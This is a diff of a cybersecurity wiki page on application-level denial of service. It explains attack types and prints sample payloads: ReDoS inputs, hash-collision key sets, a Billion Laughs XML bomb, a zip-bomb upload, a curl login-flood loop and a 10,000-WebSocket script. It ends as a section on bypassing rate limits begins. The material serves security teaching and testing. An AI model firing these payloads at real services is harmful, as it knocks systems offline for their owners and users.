@@ -1,37 +1,54 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Denial of Service (DOS) # Application-Level Denial of Service # Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O).">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Denial of Service (DOS)" />
-<meta property="og:description" content="Denial of Service (DOS) # Application-Level Denial of Service # Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O)." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Denial of Service (DOS) | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Denial of Service (DOS)# Application-Level Denial of Service# Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O). These attacks are particularly dangerous because they can be executed with minimal bandwidth, are harder to detect, and often bypass traditional network security controls.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Denial of Service (DOS)">
+	<meta property="og:description" content="Denial of Service (DOS)# Application-Level Denial of Service# Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O). These attacks are particularly dangerous because they can be executed with minimal bandwidth, are harder to detect, and often bypass traditional network security controls.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Denial of Service (DOS)">
+	<meta itemprop="description" content="Denial of Service (DOS)# Application-Level Denial of Service# Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O). These attacks are particularly dangerous because they can be executed with minimal bandwidth, are harder to detect, and often bypass traditional network security controls.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="3430">
+
+<title>Denial of Service (DOS) • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Denial-of-Service-DOS/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -39,11 +56,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -54,9 +75,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -71,8 +89,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -88,8 +106,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -175,8 +193,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -223,8 +241,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -978,8 +996,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1000,8 +1018,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1022,8 +1040,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1044,8 +1062,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1066,8 +1084,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1101,8 +1119,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1123,8 +1141,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1145,8 +1163,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1167,35 +1185,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1203,30 +1199,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Denial of Service (DOS)</strong>
+  <h3>Denial of Service (DOS)</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1317,23 +1314,11 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="denial-of-service-dos">
-  Denial of Service (DOS)
-  <a class="anchor" href="#denial-of-service-dos">#</a>
-</h1>
-<h1 id="application-level-denial-of-service">
-  Application-Level Denial of Service
-  <a class="anchor" href="#application-level-denial-of-service">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="denial-of-service-dos">Denial of Service (DOS)<a class="anchor" href="#denial-of-service-dos">#</a></h1>
+<h1 id="application-level-denial-of-service">Application-Level Denial of Service<a class="anchor" href="#application-level-denial-of-service">#</a></h1>
 <p>Application-Level Denial of Service (DoS) is a web security vulnerability that exploits the logic, features, or resource consumption patterns of web applications to exhaust server resources, degrade performance, or completely crash the service. Unlike network-layer DDoS attacks that flood bandwidth, application-layer DoS targets specific application weaknesses using seemingly legitimate requests that consume disproportionate server resources (CPU, memory, database connections, disk I/O). These attacks are particularly dangerous because they can be executed with minimal bandwidth, are harder to detect, and often bypass traditional network security controls.</p>
-<h2 id="types-of-application-level-dos-attacks">
-  Types of Application-Level DoS Attacks
-  <a class="anchor" href="#types-of-application-level-dos-attacks">#</a>
-</h2>
-<h3 id="1-resource-exhaustion-attacks">
-  1. Resource Exhaustion Attacks
-  <a class="anchor" href="#1-resource-exhaustion-attacks">#</a>
-</h3>
+<h2 id="types-of-application-level-dos-attacks">Types of Application-Level DoS Attacks<a class="anchor" href="#types-of-application-level-dos-attacks">#</a></h2>
+<h3 id="1-resource-exhaustion-attacks">1. Resource Exhaustion Attacks<a class="anchor" href="#1-resource-exhaustion-attacks">#</a></h3>
 <p>Exploit CPU, memory, or database resources through computationally expensive operations. Force server to perform intensive calculations, complex queries, or memory allocation. Can be triggered with single or minimal requests. Often target regex processing, image manipulation, encryption, or data parsing.</p>
 <p><strong>Example:</strong></p>
 <pre tabindex="0"><code>POST /api/process
@@ -1342,20 +1327,12 @@ Content-Type: application/json
 {
   &#34;data&#34;: &#34;AAAAAAAAAA...[10MB of data]&#34;,
   &#34;iterations&#34;: 999999999
-}
-</code></pre><h3 id="2-algorithmic-complexity-attacks">
-  <strong>2. Algorithmic Complexity Attacks</strong>
-  <a class="anchor" href="#2-algorithmic-complexity-attacks">#</a>
-</h3>
+}</code></pre><h3 id="2-algorithmic-complexity-attacks"><strong>2. Algorithmic Complexity Attacks</strong><a class="anchor" href="#2-algorithmic-complexity-attacks">#</a></h3>
 <p>Exploit worst-case algorithm behavior (O(n²), O(n³), or exponential time complexity). Target sorting, searching, parsing, or validation routines. Degrade performance from milliseconds to hours with crafted input. ReDoS (Regular Expression DoS) is a primary subcategory.</p>
 <p><strong>Example - ReDoS:</strong></p>
 <pre tabindex="0"><code>POST /validate
 email=(a+)+@example.com
-# Causes catastrophic backtracking in regex pattern
-</code></pre><h3 id="3-slow-http-attacks">
-  <strong>3. Slow HTTP Attacks</strong>
-  <a class="anchor" href="#3-slow-http-attacks">#</a>
-</h3>
+# Causes catastrophic backtracking in regex pattern</code></pre><h3 id="3-slow-http-attacks"><strong>3. Slow HTTP Attacks</strong><a class="anchor" href="#3-slow-http-attacks">#</a></h3>
 <ul>
 <li><strong>Slowloris:</strong> Opens many connections, sends partial HTTP headers slowly to keep connections alive</li>
 <li><strong>Slow POST:</strong> Sends HTTP POST body at extremely slow rate (1 byte/10 seconds)</li>
@@ -1370,11 +1347,7 @@ User-Agent: Mozilla/5.0\r\n
 X-Custom: value1\r\n
 [Wait 10 seconds]
 X-Custom: value2\r\n
-[Repeat until timeout]
-</code></pre><h3 id="4-application-logic-abuse">
-  <strong>4. Application Logic Abuse</strong>
-  <a class="anchor" href="#4-application-logic-abuse">#</a>
-</h3>
+[Repeat until timeout]</code></pre><h3 id="4-application-logic-abuse"><strong>4. Application Logic Abuse</strong><a class="anchor" href="#4-application-logic-abuse">#</a></h3>
 <p>Exploits business logic flaws requiring excessive processing. Trigger resource-intensive workflows through normal application features. Examples: mass email generation, bulk PDF creation, complex report generation. Legitimate requests that overwhelm backend systems.</p>
 <p><strong>Example:</strong></p>
 <pre tabindex="0"><code>POST /generate-report
@@ -1383,11 +1356,7 @@ X-Custom: value2\r\n
   &#34;end_date&#34;: &#34;2026-12-31&#34;,
   &#34;include_all_fields&#34;: true,
   &#34;format&#34;: &#34;pdf&#34;
-}
-</code></pre><h3 id="5-hash-collision-dos">
-  <strong>5. Hash Collision DoS</strong>
-  <a class="anchor" href="#5-hash-collision-dos">#</a>
-</h3>
+}</code></pre><h3 id="5-hash-collision-dos"><strong>5. Hash Collision DoS</strong><a class="anchor" href="#5-hash-collision-dos">#</a></h3>
 <ul>
 <li>Exploits predictable hash functions in hash tables</li>
 <li>Sends keys designed to collide in same bucket</li>
@@ -1403,19 +1372,14 @@ X-Custom: value2\r\n
 Host: target.com
 Content-Type: application/x-www-form-urlencoded
 
-EzEzEzEz=x&amp;EzEzEzFY=x&amp;EzEzFYEz=x&amp;EzEzFYFY=x&amp;EzFYEzEz=x&amp;...[65,536 keys]
-</code></pre><ul>
+EzEzEzEz=x&amp;EzEzEzFY=x&amp;EzEzFYEz=x&amp;EzEzFYFY=x&amp;EzFYEzEz=x&amp;...[65,536 keys]</code></pre><ul>
 <li><strong>Java (<code>String.hashCode()</code>):</strong></li>
 </ul>
 <p><code>&quot;Aa&quot;</code> and <code>&quot;BB&quot;</code> both produce hashCode <code>2112</code>. Combinations like <code>&quot;AaAa&quot;</code>, <code>&quot;AaBB&quot;</code>, <code>&quot;BBAa&quot;</code>, <code>&quot;BBBB&quot;</code> all collide:</p>
 <pre tabindex="0"><code>POST /api/data HTTP/1.1
 Content-Type: application/json
 
-{&#34;AaAaAaAa&#34;:1,&#34;AaAaAaBB&#34;:1,&#34;AaBBAaAa&#34;:1,&#34;AaBBBBBB&#34;:1,...[65,536 colliding keys]}
-</code></pre><h3 id="6-xmljson-bomb-attacks">
-  <strong>6. XML/JSON Bomb Attacks</strong>
-  <a class="anchor" href="#6-xmljson-bomb-attacks">#</a>
-</h3>
+{&#34;AaAaAaAa&#34;:1,&#34;AaAaAaBB&#34;:1,&#34;AaBBAaAa&#34;:1,&#34;AaBBBBBB&#34;:1,...[65,536 colliding keys]}</code></pre><h3 id="6-xmljson-bomb-attacks"><strong>6. XML/JSON Bomb Attacks</strong><a class="anchor" href="#6-xmljson-bomb-attacks">#</a></h3>
 <ul>
 <li><strong>Billion Laughs Attack (XML):</strong> Nested entity expansion consuming exponential memory</li>
 <li><strong>JSON Depth Attack:</strong> Deeply nested JSON objects exhausting parser stack</li>
@@ -1430,11 +1394,7 @@ Content-Type: application/json
   &lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;
   &lt;!-- Continue nesting... --&gt;
 ]&gt;
-&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;
-</code></pre><h3 id="7-database-query-dos">
-  <strong>7. Database Query DoS</strong>
-  <a class="anchor" href="#7-database-query-dos">#</a>
-</h3>
+&lt;lolz&gt;&amp;lol9;&lt;/lolz&gt;</code></pre><h3 id="7-database-query-dos"><strong>7. Database Query DoS</strong><a class="anchor" href="#7-database-query-dos">#</a></h3>
 <ul>
 <li>Crafted inputs forcing expensive database operations</li>
 <li>Unoptimized queries, missing indexes, full table scans</li>
@@ -1443,11 +1403,7 @@ Content-Type: application/json
 </ul>
 <p><strong>Example:</strong></p>
 <pre tabindex="0"><code>GET /search?q=%25&amp;sort=random&amp;limit=999999
-# Forces full table scan with random sorting
-</code></pre><h3 id="8-file-upload-dos">
-  <strong>8. File Upload DoS</strong>
-  <a class="anchor" href="#8-file-upload-dos">#</a>
-</h3>
+# Forces full table scan with random sorting</code></pre><h3 id="8-file-upload-dos"><strong>8. File Upload DoS</strong><a class="anchor" href="#8-file-upload-dos">#</a></h3>
 <ul>
 <li>Upload extremely large files to exhaust disk space</li>
 <li>Upload specially crafted files (zip bombs, decompression bombs)</li>
@@ -1455,15 +1411,8 @@ Content-Type: application/json
 <li>Filename length attacks, path traversal combined with storage exhaustion</li>
 </ul>
 <p><strong>Example - Zip Bomb:</strong></p>
-<pre tabindex="0"><code>Upload: 42.zip (42 KB compressed → 4.5 PB uncompressed)
-</code></pre><h2 id="attack-surfaces">
-  <strong>Attack Surfaces</strong>
-  <a class="anchor" href="#attack-surfaces">#</a>
-</h2>
-<h3 id="api-endpoints">
-  <strong>API Endpoints</strong>
-  <a class="anchor" href="#api-endpoints">#</a>
-</h3>
+<pre tabindex="0"><code>Upload: 42.zip (42 KB compressed → 4.5 PB uncompressed)</code></pre><h2 id="attack-surfaces"><strong>Attack Surfaces</strong><a class="anchor" href="#attack-surfaces">#</a></h2>
+<h3 id="api-endpoints"><strong>API Endpoints</strong><a class="anchor" href="#api-endpoints">#</a></h3>
 <p>APIs often lack rate limiting and accept complex inputs that trigger resource-intensive operations. Common vulnerable patterns:</p>
 <ul>
 <li>Search/filter endpoints with unlimited result sets</li>
@@ -1480,11 +1429,7 @@ Content-Type: application/json
     {&#34;name&#34;: &#34;user2&#34;, ...},
     ... [repeat 100,000 times]
   ]
-}
-</code></pre><h3 id="authentication-endpoints">
-  <strong>Authentication Endpoints</strong>
-  <a class="anchor" href="#authentication-endpoints">#</a>
-</h3>
+}</code></pre><h3 id="authentication-endpoints"><strong>Authentication Endpoints</strong><a class="anchor" href="#authentication-endpoints">#</a></h3>
 <p>Login, registration, and password reset forms are prime DoS targets. Attack vectors:</p>
 <ul>
 <li>Expensive password hashing algorithms (bcrypt with high cost factor)</li>
@@ -1497,11 +1442,7 @@ Content-Type: application/json
 for i in {1..1000}; do
   curl -X POST https://target.com/login \
     -d &#34;username=test$i&amp;password=$(head -c 1000 /dev/urandom | base64)&#34;
-done
-</code></pre><h3 id="search-functionality">
-  <strong>Search Functionality</strong>
-  <a class="anchor" href="#search-functionality">#</a>
-</h3>
+done</code></pre><h3 id="search-functionality"><strong>Search Functionality</strong><a class="anchor" href="#search-functionality">#</a></h3>
 <p>Search features process user queries against large datasets. Vulnerable patterns:</p>
 <ul>
 <li>Wildcard searches (<code>%</code>, ) without length restrictions</li>
@@ -1512,11 +1453,7 @@ done
 </ul>
 <p><strong>Testing approach:</strong></p>
 <pre tabindex="0"><code>GET /search?q=%25&amp;category=all&amp;sort=relevance&amp;page=1&amp;limit=999999999
-GET /search?q=(a+)+b&amp;type=regex
-</code></pre><h3 id="file-upload-handlers">
-  <strong>File Upload Handlers</strong>
-  <a class="anchor" href="#file-upload-handlers">#</a>
-</h3>
+GET /search?q=(a+)+b&amp;type=regex</code></pre><h3 id="file-upload-handlers"><strong>File Upload Handlers</strong><a class="anchor" href="#file-upload-handlers">#</a></h3>
 <p>File processing operations are computationally expensive. Attack vectors:</p>
 <ul>
 <li>Image resizing/thumbnail generation</li>
@@ -1531,11 +1468,7 @@ dd if=/dev/zero of=large.jpg bs=1M count=1024
 
 # Upload decompression bomb
 curl -X POST https://target.com/upload \
-  -F &#34;file=@42.zip&#34;
-</code></pre><h3 id="websocket-connections">
-  <strong>WebSocket Connections</strong>
-  <a class="anchor" href="#websocket-connections">#</a>
-</h3>
+  -F &#34;file=@42.zip&#34;</code></pre><h3 id="websocket-connections"><strong>WebSocket Connections</strong><a class="anchor" href="#websocket-connections">#</a></h3>
 <p>WebSockets maintain persistent connections consuming server resources. Attack vectors:</p>
 <ul>
 <li>Open maximum connections without sending data</li>
@@ -1551,11 +1484,7 @@ for (let i = 0; i &lt; 10000; i++) {
     // Keep alive without useful data
     setInterval(() =&gt; ws.send(&#39;ping&#39;), 30000);
   };
-}
-</code></pre><h3 id="graphql-endpoints">
-  <strong>GraphQL Endpoints</strong>
-  <a class="anchor" href="#graphql-endpoints">#</a>
-</h3>
+}</code></pre><h3 id="graphql-endpoints"><strong>GraphQL Endpoints</strong><a class="anchor" href="#graphql-endpoints">#</a></h3>
 <p>GraphQL allows deeply nested queries and batching. Vulnerable patterns:</p>
 <ul>
 <li>Circular query relationships</li>
@@ -1579,11 +1508,7 @@ for (let i = 0; i &lt; 10000; i++) {
       }
     }
   }
-}
-</code></pre><h3 id="webhookcallback-urls">
-  <strong>Webhook/Callback URLs</strong>
-  <a class="anchor" href="#webhookcallback-urls">#</a>
-</h3>
+}</code></pre><h3 id="webhookcallback-urls"><strong>Webhook/Callback URLs</strong><a class="anchor" href="#webhookcallback-urls">#</a></h3>
 <p>Applications accepting callback URLs for notifications. Attack vectors:</p>
 <ul>
 <li>Specify slow-responding servers</li>
@@ -1596,11 +1521,7 @@ for (let i = 0; i &lt; 10000; i++) {
 {
   &#34;callback_url&#34;: &#34;http://10.255.255.1:81/callback&#34;,
   &#34;events&#34;: [&#34;user.created&#34;, &#34;user.updated&#34;, &#34;user.deleted&#34;]
-}
-</code></pre><h3 id="emailnotification-systems">
-  <strong>Email/Notification Systems</strong>
-  <a class="anchor" href="#emailnotification-systems">#</a>
-</h3>
+}</code></pre><h3 id="emailnotification-systems"><strong>Email/Notification Systems</strong><a class="anchor" href="#emailnotification-systems">#</a></h3>
 <p>Features triggering email or SMS delivery. Attack vectors:</p>
 <ul>
 <li>Mass invitation systems</li>
@@ -1618,11 +1539,7 @@ for (let i = 0; i &lt; 10000; i++) {
     ... [10,000 emails]
   ],
   &#34;message&#34;: &#34;Join our platform!&#34;
-}
-</code></pre><h3 id="exportreport-generation">
-  <strong>Export/Report Generation</strong>
-  <a class="anchor" href="#exportreport-generation">#</a>
-</h3>
+}</code></pre><h3 id="exportreport-generation"><strong>Export/Report Generation</strong><a class="anchor" href="#exportreport-generation">#</a></h3>
 <p>Features that generate large reports or data exports. Vulnerable patterns:</p>
 <ul>
 <li>No time range restrictions</li>
@@ -1632,53 +1549,37 @@ for (let i = 0; i &lt; 10000; i++) {
 <li>Synchronous processing blocking requests</li>
 </ul>
 <p><strong>Testing approach:</strong></p>
-<pre tabindex="0"><code>GET /export/transactions?format=pdf&amp;start_date=1900-01-01&amp;end_date=2026-12-31&amp;include_attachments=true
-</code></pre><h2 id="exploitation-and-bypassing-defenses">
-  <strong>Exploitation and Bypassing Defenses</strong>
-  <a class="anchor" href="#exploitation-and-bypassing-defenses">#</a>
-</h2>
-<h3 id="rate-limiting-bypass-techniques">
-  <strong>Rate Limiting Bypass Techniques</strong>
-  <a class="anchor" href="#rate-limiting-bypass-techniques">#</a>
-</h3>
+<pre tabindex="0"><code>GET /export/transactions?format=pdf&amp;start_date=1900-01-01&amp;end_date=2026-12-31&amp;include_attachments=true</code></pre><h2 id="exploitation-and-bypassing-defenses"><strong>Exploitation and Bypassing Defenses</strong><a class="anchor" href="#exploitation-and-bypassing-defenses">#</a></h2>
+<h3 id="rate-limiting-bypass-techniques"><strong>Rate Limiting Bypass Techniques</strong><a class="anchor" href="#rate-limiting-bypass-techniques">#</a></h3>
 <p><strong>IP Rotation:</strong></p>
 <pre tabindex="0"><code># Use proxy chains or cloud providers
